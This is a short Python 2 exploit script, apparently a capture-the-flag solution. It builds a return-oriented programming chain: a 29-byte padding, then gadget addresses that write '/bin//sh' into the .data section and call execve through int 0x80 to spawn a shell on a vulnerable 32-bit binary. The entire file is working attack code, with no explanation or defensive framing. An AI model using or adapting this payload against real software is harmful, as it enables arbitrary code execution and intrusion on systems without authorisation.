#!/bin/python
from __future__ import print_function
from struct import pack

p = 'A'*29

p += pack('<I', 0x0806ea3a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb006) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a35d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ea3a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb006) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a35d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ea3a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054450) # xor eax, eax ; ret
p += pack('<I', 0x0809a35d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806ea61) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806ea3a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054450) # xor eax, eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x08049501) # int 0x80

hex_payload = p.encode('hex')

#print(hex_payload)
print(p)
